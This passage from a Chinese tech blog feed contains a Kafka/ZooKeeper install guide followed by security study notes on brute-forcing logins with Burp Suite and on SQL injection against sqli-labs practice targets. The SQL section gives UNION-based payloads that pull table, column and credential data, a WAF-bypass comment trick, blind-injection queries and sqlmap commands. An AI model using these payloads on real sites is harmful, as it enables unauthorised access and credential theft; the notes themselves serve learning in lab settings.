class="line">dataDir&#x3D;&#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;data </span><br><span class="line">dataLogDir&#x3D;&#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;logs</span><br></pre></td></tr></table></figure><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802185319790.png" alt="image-20200802185319790"></p><p>保存并退出文件修改。</p><p>4) 启动zookeeper</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;bin&#x2F;</span><br><span class="line"></span><br><span class="line">[root@172 bin]# .&#x2F;zkServer.sh start</span><br><span class="line">ZooKeeper JMX enabled by default</span><br><span class="line">Using config: &#x2F;usr&#x2F;local&#x2F;zookeeper&#x2F;apache-zookeeper-3.5.8-bin&#x2F;bin&#x2F;..&#x2F;conf&#x2F;zoo.cfg</span><br><span class="line">Starting zookeeper ... STARTED</span><br></pre></td></tr></table></figure><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802185712170.png" alt="image-20200802185712170"></p><p>ZooKeeper启动成功</p><h2 id="安装kafka"><a href="#安装kafka" class="headerlink" title="安装kafka"></a>安装kafka</h2><h4 id="1、下载"><a href="#1、下载" class="headerlink" title="1、下载"></a>1、下载</h4><p>从 Kafka 官网下载页 <a href="https://kafka.apache.org/downloads" target="_blank" rel="noopener">https://kafka.apache.org/downloads</a> 获取安装文件，当前最新的稳定版本是 2.4.1，于 2020 年 3 月 12 日发行。这里选择下载二进制文件 kafka_2.12-2.4.1.tgz。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src</span><br><span class="line">wget https:&#x2F;&#x2F;mirror.bit.edu.cn&#x2F;apache&#x2F;kafka&#x2F;2.4.1&#x2F;kafka_2.12-2.4.1.tgz</span><br></pre></td></tr></table></figure><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802193122030.png" alt="image-20200802193122030"></p><h4 id="2、创建安装目录"><a href="#2、创建安装目录" class="headerlink" title="2、创建安装目录"></a>2、创建安装目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir &#x2F;usr&#x2F;local&#x2F;kafka</span><br></pre></td></tr></table></figure><h4 id="3、解压缩"><a href="#3、解压缩" class="headerlink" title="3、解压缩"></a>3、解压缩</h4><p>解压缩文件 kafka_2.12-2.4.1.tgz 至目录 /usr/local/kafka：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar xvzf kafka_2.12-2.4.1.tgz -C &#x2F;usr&#x2F;local&#x2F;kafka --strip 1</span><br></pre></td></tr></table></figure><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200802193436385.png" alt="image-20200802193436385"></p><p>进入目录 /usr/local/kafka，可以看到以下子目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@172 src]# cd &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;</span><br><span class="line">[root@172 kafka]# ll</span><br><span class="line">total 56</span><br><span class="line">drwxr-xr-x. 3 root root  4096 Mar  3 08:34 bin</span><br><span class="line">drwxr-xr-x. 2 root root  4096 Mar  3 08:34 config</span><br><span class="line">drwxr-xr-x. 2 root root  8192 Aug  2 19:34 libs</span><br><span class="line">-rw-r--r--. 1 root root 32216 Mar  3 08:32 LICENSE</span><br><span class="line">-rw-r--r--. 1 root root   337 Mar  3 08:32 NOTICE</span><br><span class="line">drwxr-xr-x. 2 root root    44 Mar  3 08:34 site-docs</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;bin目录下是操作 Kafka 的可执行脚本（.sh 文件），还包含在 windows 系统下的可执行脚本（.bat 文件），包括 Kafka 启动&#x2F;停止脚本、消费者性能测试脚本、生产者性能测试脚本、分区重分配脚本等；</span><br><span class="line"></span><br><span class="line">&#x2F;config目录是存放配置文件；</span><br><span class="line"></span><br><span class="line">&#x2F;libs目录是存放依赖库文件；</span><br><span class="line"></span><br><span class="line">&#x2F;logs目录存放的是 Kafka 的运行日志文件。</span><br></pre></td></tr></table></figure><h4 id="4、配置"><a href="#4、配置" class="headerlink" title="4、配置"></a>4、配置</h4><p>打开配置文件config/server.properties，修改 listeners 配置和 zookeeper 地址，具体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd  &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;config</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;监听地址</span><br><span class="line">listeners&#x3D;PLAINTEXT:&#x2F;&#x2F;172.16.12.144:9092</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;zookeeper地址</span><br><span class="line">zookeeper.connect&#x3D;172.16.12.144:2181</span><br></pre></td></tr></table></figure><p>保存退出</p><h4 id="5、添加kafka账号"><a href="#5、添加kafka账号" class="headerlink" title="5、添加kafka账号"></a>5、添加kafka账号</h4><p>在启动 Kafka 服务之前，为保障系统安全，添加运行 Kafka 服务的账号，并以较低权限账号运行 Kafka 服务，且禁用该账号的 ssh 登录权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;添加kafka账号</span><br><span class="line">useradd kafka</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;设置kafka账号密码</span><br><span class="line">passwd kafka</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;将目录所有者和组设置为kafka</span><br><span class="line">chown -R kafka:kafka &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;</span><br></pre></td></tr></table></figure><p>切换至 kafka 账号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su kafka</span><br></pre></td></tr></table></figure><p>kafka日志保存位置设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;config</span><br><span class="line">vim server.properties</span><br></pre></td></tr></table></figure><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804233616568.png" alt="image-20200804233616568"></p><p>将log存放目录设置为非/tmp目录即可，然后对目录进行赋权即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R kafka:kafka &#x2F;data</span><br></pre></td></tr></table></figure><h4 id="6、启动kafka服务"><a href="#6、启动kafka服务" class="headerlink" title="6、启动kafka服务"></a>6、启动kafka服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;kafka&#x2F;</span><br><span class="line">&#x2F;bin&#x2F;kafka-server-start.sh .&#x2F;config&#x2F;server.properties</span><br></pre></td></tr></table></figure><p>以守护进程（后台进程）的方式启动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;bin&#x2F;kafka-server-start.sh .&#x2F;config&#x2F;server.properties &amp;</span><br></pre></td></tr></table></figure><h4 id="7、停止kafka服务"><a href="#7、停止kafka服务" class="headerlink" title="7、停止kafka服务"></a>7、停止kafka服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;kafka</span><br><span class="line">.&#x2F;bin&#x2F;kafka-server-stop.sh</span><br></pre></td></tr></table></figure><h2 id="kafka可视化"><a href="#kafka可视化" class="headerlink" title="kafka可视化"></a>kafka可视化</h2><h4 id="1、可视化工具"><a href="#1、可视化工具" class="headerlink" title="1、可视化工具"></a>1、可视化工具</h4><p>kafka的可视化工具为kafkatool，可用于查看kafka消息队列中的内容及上报和消费。</p><p>下载地址：https[]]://www[.]kafkatool.com/download.html</p><p>可选择相应的版本和操作系统进行下载</p><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804231604138.png" alt="image-20200804231604138"></p><h4 id="2、工具简单使用"><a href="#2、工具简单使用" class="headerlink" title="2、工具简单使用"></a>2、工具简单使用</h4><p>安装完成后，搜索kafkatool打开</p><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804231807412.png" alt="image-20200804231807412"></p><p>点击file，新增连接</p><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804231949654.png" alt="image-20200804231949654"></p><p>连接设置界面如下</p><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804232053262.png" alt="image-20200804232053262"></p><p>需要设置的地方，其他默认即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cluster name:集群名称</span><br><span class="line">kafka version:版本根据安装的kafka版本选择对应的版本</span><br><span class="line">Zookeeper host：zookeeper服务器IP</span><br></pre></td></tr></table></figure><p>点击ping测试是否联通</p><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804232551742.png" alt="image-20200804232551742"></p><h4 id="3、设置队列内容显示格式"><a href="#3、设置队列内容显示格式" class="headerlink" title="3、设置队列内容显示格式"></a>3、设置队列内容显示格式</h4><p>设置消息队列中的内容显示格式，点击tools，选择settings</p><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804232754502.png" alt="image-20200804232754502"></p><p>点击topics，可以将key和message都设置为string显示，key不要设置为NO key</p><p><img src="/2020/08/02/CentOS7%E5%AE%89%E8%A3%85kafka/image-20200804232905027.png" alt="image-20200804232905027"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>http[]s://w[]ww.linjiangxiong.com/2020/03/19/how-to-install-apache-kafka-on-centos7/</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="运维" scheme="http://yoursite.com/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="运维" scheme="http://yoursite.com/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>暴力破解</title>
    <link href="http://yoursite.com/2020/08/01/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/08/01/暴力破解/</id>
    <published>2020-08-01T14:41:26.000Z</published>
    <updated>2020-08-01T14:42:17.290Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="暴力破解-1"><a href="#暴力破解-1" class="headerlink" title="暴力破解"></a>暴力破解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.原理</span><br><span class="line">使用自定义字典文件中的内容与验证程序交互，从而在枚举过程中得到正确数据。</span><br><span class="line">如破解用户名、密码</span><br><span class="line">破解验证码</span><br><span class="line"></span><br><span class="line">暴力破解的前提：</span><br><span class="line">应用程序或服务器未进行限制</span><br><span class="line">具有内容涵盖全面的字典</span><br><span class="line"></span><br><span class="line">2.暴力破解方式</span><br><span class="line">在线方式</span><br><span class="line">离线方式</span><br><span class="line">破解成功取决于字典是否强大，以及本地机器与服务器性能、带宽限制等因素。</span><br><span class="line"></span><br><span class="line">3.使用Burpsuite进行暴力破解</span><br><span class="line">判断依据：登录成功与失败返回的HTML内容不同，大小不同，根据大小不同选出唯一的内容。</span><br></pre></td></tr></table></figure><h2 id="暴力破解表单内容"><a href="#暴力破解表单内容" class="headerlink" title="暴力破解表单内容"></a>暴力破解表单内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.HTML表单</span><br><span class="line">表单是一个包含表单元素的区域。</span><br><span class="line">表单元素是允许用户在表单中输入内容，如文本域、下拉列表、单选框、复选框等。</span><br><span class="line"></span><br><span class="line">2.暴力破解POST提交数据</span><br><span class="line">在登录页面经常使用POST方式提交数据。通过Burpsuite对POST提交的数据进行暴力破解。</span><br><span class="line"></span><br><span class="line">3.暴力破解验证码</span><br></pre></td></tr></table></figure><h2 id="HTTP-basic认证"><a href="#HTTP-basic认证" class="headerlink" title="HTTP basic认证"></a>HTTP basic认证</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.HTTP basic认证</span><br><span class="line">基本认证 basic authorizcation,是http1.0提出的认证方法。</span><br><span class="line"></span><br><span class="line">基本认证步骤：</span><br><span class="line">(1)服务端访问一个受http基本认证保护的资源</span><br><span class="line">(2)服务器返回401状态，要求客户端提供用户名和密码进行认证</span><br><span class="line">(3)客户端将输入的用户名密码用base64进行编码后，采用非加密明文方式发送给服务器</span><br><span class="line">(4)如果认证成功，则返回相应的资源。如果认证失败，则返回401状态，要求进行重新认证</span><br><span class="line"></span><br><span class="line">2.burpsuite分析认证过程</span><br><span class="line">使用Burpsuite对HTTP Basic认证进行抓包分析</span><br><span class="line">Authorizcation：Basic xxxxxx（base64加密后的用户名和密码）</span><br><span class="line"></span><br><span class="line">3.暴力破解burpsuite认证</span><br><span class="line">使用Burpsuite对目标进行暴力破解。</span><br><span class="line">在intruder里，选中base64加密后的用户名密码，add添加，选中payload；</span><br><span class="line">在payload processing里选中添加encode规则，选中base64，开始暴力破解。</span><br></pre></td></tr></table></figure><h2 id="HTTP-basic认证字典生成"><a href="#HTTP-basic认证字典生成" class="headerlink" title="HTTP basic认证字典生成"></a>HTTP basic认证字典生成</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.字典生成思路</span><br><span class="line">字典生成是针对具体目标生成，确定目标：username，passwd</span><br><span class="line">思路：</span><br><span class="line">读取字典文件内容；</span><br><span class="line">对读取来的文件内容进行拼接；</span><br><span class="line">将新生成的内容写入到最终字典文件中，要符合HTTP Basic认证。</span><br></pre></td></tr></table></figure><h2 id="Burpsuite设置HTTP认证"><a href="#Burpsuite设置HTTP认证" class="headerlink" title="Burpsuite设置HTTP认证"></a>Burpsuite设置HTTP认证</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.设置原因</span><br><span class="line">在web应用测试过程中，如果web设置了HTTP认证，就需要使用用户名、密码进行登录才能进行保护区域的资源访问。</span><br><span class="line"></span><br><span class="line">Burpsuite中提供了用于认证设置的功能模块可以设置HTTP认证需要的用户名、密码，方便测试。</span><br><span class="line">在useroptions在的Platform Authentication，点击add，填写destination host为目标ip，Authentication type选为Basic。</span><br></pre></td></tr></table></figure><h2 id="离线暴力破解"><a href="#离线暴力破解" class="headerlink" title="离线暴力破解"></a>离线暴力破解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.离线破解</span><br><span class="line">离线破解：在破解过程中，已经获得加密密文，在不与目标服务器交互的情况下，利用在线网站或本地程序对密文进行破解。</span><br><span class="line"></span><br><span class="line">离线破解不会触发密码锁定机制；</span><br><span class="line">不会产生大量的登录失败日志引起注意。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="暴力破解" scheme="http://yoursite.com/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入</title>
    <link href="http://yoursite.com/2020/08/01/SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2020/08/01/SQL注入/</id>
    <published>2020-08-01T14:36:48.000Z</published>
    <updated>2020-08-01T14:38:34.200Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">语言分类：解释型语言和编译型语言</span><br><span class="line">解释型语言：在运行时边解释边执行的语言。</span><br><span class="line">编译型语言：代码一次编译，以后都可以直接执行。</span><br><span class="line"></span><br><span class="line">在解释型语言中，如果程序与用户进行交互。用户就可以构造特殊的输入来拼接到程序中执行，从而使得程序依据用户输入执行有可能存在恶意行为的代码。</span><br><span class="line"></span><br><span class="line">cms逻辑：</span><br><span class="line">index.php首页展示内容，具有文章列表（链接具有文章id）、artcles.php文章详细页，URL中article.php？id&#x3D;文章id读取id文章。</span><br><span class="line"></span><br><span class="line">SQL注入验证：</span><br><span class="line">‘单引号闭合字符串型</span><br><span class="line">and1&#x3D;1  and1&#x3D;2 闭合数字型</span><br></pre></td></tr></table></figure><h2 id="mysql注入知识"><a href="#mysql注入知识" class="headerlink" title="mysql注入知识"></a>mysql注入知识</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">1.Mysql5.x数据结构：</span><br><span class="line"></span><br><span class="line">在Mysql5.0及以上的版本中，为方便管理，默认定义了information_schema元数据库，用来存储数据库元信息。其中具有表schemata（数据库名）、tables（表名）、columns（列名或字段名）。</span><br><span class="line">在schemata表中，schema_name字段用来存储数据库名</span><br><span class="line">在tables表中，table_schema和table_name分别用来存储数据库名和表名</span><br><span class="line">在columns表中，table_schema（数据库名）、table_name（表名）、column_name（字段名）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.mysql增删改查</span><br><span class="line">SELECT 列名 from 表名  where 字段1&#x3D;’条件1‘ and 字段2&#x3D;’条件2‘</span><br><span class="line">INSERT INTO table_name（列1，列2。。）VALUES（值1，值2.。。。）</span><br><span class="line">UPDATE 表名称 SET 列名称&#x3D;新值  WHERE 列名称&#x3D;某值</span><br><span class="line">DELETE FROM  表名称 WHERE 列名称&#x3D;值</span><br><span class="line"></span><br><span class="line">显示数据库：show database；</span><br><span class="line">进入某一数据库：use 数据库名；</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.Mysql常用函数：</span><br><span class="line">mysql常用的聚合函数：</span><br><span class="line">user()：查看当前mysql登录用户名</span><br><span class="line">database()：查看当前使用的mysql数据库名</span><br><span class="line">version():查看当前mysql版本</span><br><span class="line"></span><br><span class="line">limlit关键字：</span><br><span class="line">limit m，n：从m行开始，到m+n行（走几行）。</span><br><span class="line"></span><br><span class="line">在mysql中常用的注释符：#或--空格或&#x2F;**&#x2F;</span><br><span class="line">空格的编码为%20</span><br><span class="line">内联注释：&#x2F;*！SQL语句*&#x2F;  只有MySQL可以识别，常用来绕WAF</span><br><span class="line">使用内联注释注入：select * from articles where id&#x3D;-1&#x2F;*!union*&#x2F;&#x2F;*!select *&#x2F;1,2,3,4</span><br></pre></td></tr></table></figure><h2 id="sqli注入靶场搭建"><a href="#sqli注入靶场搭建" class="headerlink" title="sqli注入靶场搭建"></a>sqli注入靶场搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1.phpstudy环境安装</span><br><span class="line">phpstudy是一个PHP调试环境的程序集成包。</span><br><span class="line">该程序包集成最新的Apache+PHP+Mysql+phpmyadmin+Zendoptimizer，一次性安装，无需配置即可使用，学习PHP只需一个集成包。</span><br><span class="line">下载地址：http:&#x2F;&#x2F;phpstudy.php.cn</span><br><span class="line"></span><br><span class="line">2.火狐浏览器插件</span><br><span class="line">火狐浏览器采用Gecko排版引擎，支持多种操作系统。</span><br><span class="line">安全方面的插件：</span><br><span class="line">hackbar、Firebug、Live http headers（查看请求响应的HTTP数据包）、Tamper data</span><br><span class="line"></span><br><span class="line">3.sqlmap安装</span><br><span class="line">sqlmap是一款强大的SQL注入漏洞检测和利用工具。官方网站：http:&#x2F;&#x2F;www.sqlmap.org&#x2F;</span><br><span class="line">sqlmap为python语言编写的工具。需要先安装python环境，安装时add to path添加到系统变量里。</span><br><span class="line"></span><br><span class="line">windows下搭建sqlmap:</span><br><span class="line">下载好程序，cd相应目录，python sqlmap.py即可启动</span><br><span class="line"></span><br><span class="line">4.sqli-Lab安装</span><br><span class="line">Sqli-labs是一个印度程序员写的，使用php进行编写的，用来练习sql注入的。</span><br><span class="line">下载：https:&#x2F;&#x2F;github.com&#x2F;Audi-1&#x2F;sqli-labs</span><br><span class="line">下载好打开sql-connection&#x2F;db-creds.inc，修改默认数据库连接密码。</span><br><span class="line">切换phpstudy至5.3版本可解决PDO剔除报错。</span><br></pre></td></tr></table></figure><h2 id="GET基于报错的SQL注入"><a href="#GET基于报错的SQL注入" class="headerlink" title="GET基于报错的SQL注入"></a>GET基于报错的SQL注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">1.SQL注入的分类</span><br><span class="line">根据注入位置数据类型可将SQL注入分为两类：数字型和字符型</span><br><span class="line">数字型：select * from table where id&#x3D;用户输入id</span><br><span class="line">字符型：select * from table where id&#x3D;&#39;用户输入的id&#39;</span><br><span class="line"></span><br><span class="line">通过在URL中修改对应的ID值，为正常数字、字符（单引号、双引号、单双引号、括号）、反斜杠\来探测URL中是否存在注入点。</span><br><span class="line">’单引号URL编码后为%27</span><br><span class="line"></span><br><span class="line">2.GET基于报错的SQL注入的发现</span><br><span class="line">id&#x3D;1‘   先让mysql报错，然后进行闭合：id&#x3D;1’）--+</span><br><span class="line">id&#x3D;1‘’  先让mysql报错，然后进行闭合：id&#x3D;1&#39;&#39;）--%20</span><br><span class="line"></span><br><span class="line">3.利用</span><br><span class="line">利用order by判断字段数</span><br><span class="line">注入位置分析：</span><br><span class="line">select username,passwd from admin where id&#x3D;&#39;id&#39; order by 10--+&#39; limit 0,1</span><br><span class="line"></span><br><span class="line">利用union select联合查询，获取表名</span><br><span class="line">0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where </span><br><span class="line">table_schema&#x3D;database()--+</span><br><span class="line">0&#39;是为了让mysql报错，爆出可以利用的位置。</span><br><span class="line"></span><br><span class="line">利用union select联合查询，获取字段名</span><br><span class="line">0&#39; union select 1,group_conact(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39;--+</span><br><span class="line">利用union select联合查询，获取字段值</span><br><span class="line">0’ union select 1,group_conact(username,0x3a,passwd),3 from users--+</span><br><span class="line"></span><br><span class="line">4.sqlmap工具</span><br><span class="line">python sqlmap.py -u &#39;http:&#x2F;&#x2F;xxx.xxx.com&#x2F;?id&#x3D;1&#39; --dbs --batch</span><br><span class="line">-D:查询数据库</span><br><span class="line">-T:查询相应数据库的表</span><br><span class="line">--columns：查询相应表的字段</span><br></pre></td></tr></table></figure><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1.什么是盲注</span><br><span class="line">注入攻击的一种，向数据库发送true或false这样的问题，并根据应用程序返回的信息判断结果。这种攻击的出现是因为应用程序为只显示常规错误，并没有解决SQL注入存在的代码问题。</span><br><span class="line"></span><br><span class="line">当利用SQL注入进行攻击，web应用程序会显示，后端数据库SQL查询返回的错误信息。而若数据库没有输出数据到web界面，而通过询问一些列的true和false问题，强制从数据库获取数据。</span><br><span class="line"></span><br><span class="line">2.GET基于时间的盲注</span><br><span class="line">if(ascii(substr(database(),1,1)&#x3D;115,1,sleep(3)))</span><br><span class="line">当数据库名第一个字母的ascii码等于115时，执行一次sleep(3)函数等待3秒</span><br><span class="line">网页上检查元素，查看网络的返回时间。</span><br><span class="line"></span><br><span class="line">3.GET基于Boolean的盲注</span><br><span class="line">基于布尔型的盲注，通常采用下面方法猜解字符串：</span><br><span class="line">select length(database());</span><br><span class="line">select substr(database(),1,1);</span><br><span class="line">select ascii(substr(database(),1,1))&gt;N;</span><br><span class="line">select ascii(substr(database(),1,1))&#x3D;N;</span><br><span class="line">select ascii(substr(database(),1,1))&lt;N;</span><br><span class="line"></span><br><span class="line">4.使用sqlmap进行盲注</span><br><span class="line">时间盲注：</span><br><span class="line">python sqlmap.py -u &#39;xxx.xxx.com&#x2F;?id&#x3D;1&#39; --technique -T </span><br><span class="line">布尔盲注：</span><br><span class="line">python sqlmap.py -u &#39;xxx.xxx.com&#x2F;?id&#x3D;1&#39; --technique 